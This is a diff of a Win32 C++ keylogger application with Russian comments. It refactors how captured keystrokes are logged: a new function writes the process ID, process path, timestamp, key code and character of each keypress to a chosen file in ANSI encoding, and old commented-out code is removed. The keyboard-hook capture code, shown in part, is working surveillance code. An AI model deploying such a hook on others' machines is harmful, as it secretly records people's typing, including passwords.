@@ -217,44 +217,6 @@ void DefineColumns(HWND hwndLV)
     }
 }
 
-/*
-// сортировка по убыванию
-void KeyloggerFilling(HWND hwndListView) {
-
-    // Удаляем все элементы перед добавлением новых
-    ListView_DeleteAllItems(hwndListView);
-
-    // Заполняем таблицу данными
-    for (size_t i = 0; i < keyloggerRecords.size(); ++i) {
-        const auto& record = keyloggerRecords[i];
-
-        LVITEM lvItem;
-        lvItem.mask = LVIF_TEXT;
-        lvItem.iItem = static_cast<int>(i);  // Индекс элемента для вставки в ListView
-        lvItem.iSubItem = 0;  // Индекс первого столбца (ID процесса)
-
-        // Заполнение первого столбца (ID процесса)
-        wstring processIdText = to_wstring(record.processId);
-        lvItem.pszText = const_cast<LPWSTR>(processIdText.c_str());
-        ListView_InsertItem(hwndListView, &lvItem);
-
-        // 2. Путь к запущенному процессу (столбец 1)
-        ListView_SetItemText(hwndListView, static_cast<int>(i), 1, const_cast<LPWSTR>(record.processPath.c_str()));
-
-        // 3. Дата и время действия (столбец 2)
-        ListView_SetItemText(hwndListView, static_cast<int>(i), 2, const_cast<LPWSTR>(record.dateTime.c_str()));
-
-        // 4. Код клавиши (столбец 3)
-        wstring keyCodeText = to_wstring(record.keyCode);
-        ListView_SetItemText(hwndListView, static_cast<int>(i), 3, const_cast<LPWSTR>(keyCodeText.c_str()));
-
-        // 5. Символ клавиши (столбец 4)
-        wstring keyCharText(1, record.keyChar);
-        ListView_SetItemText(hwndListView, static_cast<int>(i), 4, const_cast<LPWSTR>(keyCharText.c_str()));
-    }
-}
-*/
-
 void KeyloggerFilling(HWND hwndListView) {
     // Удаляем все элементы перед добавлением новых
     ListView_DeleteAllItems(hwndListView);
@@ -520,85 +482,36 @@ wstring GetKeyStringFromCode(int keyCode) {
     }
 }
 
-/*
-// Процедура обработки хука клавиатуры
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION) {
-        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+void WriteToFileANSI(const KeyloggerRecord& record) {
+    // Конвертируем поля KeyloggerRecord в кодировку ANSI (Windows-1251 по умолчанию)
+    int bufferSize = WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, NULL, 0, NULL, NULL);
+    char* processPathAnsi = new char[bufferSize];
+    WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, processPathAnsi, bufferSize, NULL, NULL);
 
-        // Обрабатываем только нажатие клавиш
-        if (wParam == WM_KEYDOWN) {
-            DWORD processId;
-            GetWindowThreadProcessId(GetForegroundWindow(), &processId);
+    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, NULL, 0, NULL, NULL);
+    char* dateTimeAnsi = new char[bufferSize];
+    WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, dateTimeAnsi, bufferSize, NULL, NULL);
 
-            // Получаем путь к процессу
-            wchar_t processPath[MAX_PATH];
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-            if (hProcess) {
-                DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
-                CloseHandle(hProcess);
-            }
+    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, NULL, 0, NULL, NULL);
+    char* keyCharAnsi = new char[bufferSize];
+    WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, keyCharAnsi, bufferSize, NULL, NULL);
 
-            // Получаем текущее время
-            time_t currentTime = time(NULL);
-            tm timeInfo;
-            localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
-
-            wchar_t dateTime[120];
-            wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
-
-            // Получаем состояние клавиатуры
-            BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);  // Состояние клавиш (например, Shift, CapsLock, etc.)
-
-            // Буфер для символов
-            WCHAR szBuffer[20] = L"";
-            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 20, 0);
-
-            // Создаем запись
-            KeyloggerRecord record;
-            record.processId = processId;
-            record.processPath = processPath;
-            record.dateTime = dateTime;
-            record.keyCode = pKeyboard->vkCode;
-
-            // Если символ был получен
-            if (nChar > 0) {
-                record.keyChar = std::wstring(szBuffer, nChar);  // Преобразуем символы в строку
-            }
-            // Если символ не был получен, проверяем на специальные клавиши
-            else {
-                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);  // Получаем строку для специальных клавиш
-                if (record.keyChar.empty()) {
-                    record.keyChar = L"UNKNOWN";  // Устанавливаем значение по умолчанию для неизвестных клавиш
-                }
-            }
-
-            // Записываем в файл только если путь был выбран
-            if (globalFilePath[0] != 0) {  // Если путь не пуст
-                //std::wofstream outFile(globalFilePath, std::ios::app);
-                std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
-                if (outFile.is_open()) {
-                    outFile << record.processId << L";"
-                        << record.processPath << L";"
-                        << record.dateTime << L";"
-                        << record.keyCode << L";"
-                        << record.keyChar << std::endl;
-                    outFile.close();
-                }
-            }
-
-            // Добавляем запись в список (если нужно)
-            keyloggerRecords.push_back(record);
-
-        }
+    // Открываем файл для записи в кодировке ANSI
+    std::ofstream outFile(globalFilePath, std::ios::app);
+    if (outFile.is_open()) {
+        outFile << record.processId << ";"
+            << processPathAnsi << ";"
+            << dateTimeAnsi << ";"
+            << record.keyCode << ";"
+            << keyCharAnsi << std::endl;
+        outFile.close();
     }
 
-    KeyloggerFilling(hwndListView);
-
-    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+    // Освобождаем память
+    delete[] processPathAnsi;
+    delete[] dateTimeAnsi;
+    delete[] keyCharAnsi;
 }
-*/
 
 // Процедура обработки хука клавиатуры
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -623,12 +536,12 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             tm timeInfo;
             localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
 
-            wchar_t dateTime[120];
-            wcsftime(dateTime, sizeof(dateTime), L"%Y-%m-%d %H:%M:%S", &timeInfo);
+            std::wstring dateTime(20, L'\0');  // Строка длиной 20 символов
+            wcsftime(&dateTime[0], dateTime.size(), L"%Y-%m-%d %H:%M:%S", &timeInfo);
 
             // Получаем состояние клавиатуры
             BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);  // Состояние клавиш (например, Shift, CapsLock, etc.)
+            BOOL state = GetKeyboardState(keyboardState);  // Состояние клавиш (0-9, латиницы, кириллицы)
 
             // Буфер для символов
             WCHAR szBuffer[20] = L"";
@@ -669,18 +582,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             }
 
 
-            // Записываем в файл только если путь был выбран
+            // Запись в файл только если путь был выбран
             if (globalFilePath[0] != 0) {  // Если путь не пуст
-                //std::wofstream outFile(globalFilePath, std::ios::app);
-                std::wofstream outFile(L"keylogger_output.txt", std::ios::app);
-                if (outFile.is_open()) {
-                    outFile << record.processId << L";"
-                        << record.processPath << L";"
-                        << record.dateTime << L";"
-                        << record.keyCode << L";"
-                        << record.keyChar << std::endl;
-                    outFile.close();
-                }
+                WriteToFileANSI(record);
             }
 
             // Добавляем запись в список (если нужно)
@@ -693,6 +597,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
+
+
 
 
 // Установка хука
